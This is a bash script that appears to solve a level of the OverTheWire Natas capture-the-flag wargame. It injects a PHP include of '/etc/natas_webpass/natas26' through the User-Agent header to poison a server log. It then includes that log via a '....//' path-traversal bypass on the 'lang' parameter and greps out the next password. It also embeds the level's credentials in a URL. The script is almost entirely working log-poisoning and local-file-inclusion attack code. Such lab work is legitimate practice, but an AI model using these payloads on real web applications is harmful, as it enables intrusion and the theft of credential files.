#!/bin/bash
. ../natas.sh
natas_url="http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org"
function hack() {
	 request-with-refereer "lang=natas_webpass" "<? include('/etc/natas_webpass/natas26'); ?>" 2>&1
	 result=$(request "lang=....//logs/natas25_oc1abora817638lrk05h0hta53.log" 2>&1 | grep -Po "[\w\d]{32}")
	 password=""
	 for r in $result ; do
	 	password=$r
	done
	echo $(get-natas-url "26" "$password")
}

function request {
	curl \
		-vs \
		-d "$1" \
		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
		$natas_url
}

function request-with-refereer {
	curl \
		-vs \
		-d "$1" \
		--header "User-Agent: $2" \
		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
		$natas_url
}

function request-to-path() {
		url=$(printf "$natas_url/$1")
		echo $url
		curl \
		-vs \
		-d "$2" \
		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
		$url
}
